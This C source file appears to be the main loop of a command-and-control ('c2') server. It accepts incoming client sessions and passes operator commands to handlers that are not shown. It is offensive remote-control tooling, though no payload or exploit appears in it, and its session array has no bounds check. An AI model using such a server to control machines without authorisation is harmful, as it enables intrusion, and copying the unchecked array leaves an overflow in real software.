#include <sys/wait.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <sys/select.h>
#include <stdio.h>

#include "../common/common.h"
#include "server.h"
#include "command.h"

#define MAX_SESSIONS 16

int main(){

    int server_fd = socket_create(AF_INET, SOCK_STREAM);
    server_bind(server_fd, AF_INET, PORT);
    server_listen(server_fd, 10);

    session_info session_list[MAX_SESSIONS]; 
    int session_list_len = 0;


    while(1){

        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(STDIN_FILENO, &readfds);
        FD_SET(server_fd, &readfds);
        int maxfd = server_fd;
        printf("c2> ");
        fflush(stdout);

        int ready = select(maxfd + 1, &readfds, NULL, NULL, NULL);
        if (ready < 0) {
            perror("select");
            break;
        }

        if (FD_ISSET(server_fd, &readfds)) {
            // new client connecting
            session_info session;
            if(server_accept(server_fd, &session) < 0) continue;
            session_list[session_list_len] = session;
            session_list_len++;
            printf("\n[*] New session %d from %s:%d\n", session_list_len - 1, session.ip, session.port);
        }

        if (FD_ISSET(STDIN_FILENO, &readfds)) {
            // operator typed a command
            char cmd[256];
            ssize_t n = read(STDIN_FILENO, cmd, sizeof(cmd) - 1);
            if (n <= 0) break;
            cmd[n] = '\0';
            
            write(STDOUT_FILENO, cmd, (size_t)n);

            // parse command here
            cmd_dispatch(cmd, session_list, session_list_len);
        }
    }

    close(server_fd);
    return 0;
}


























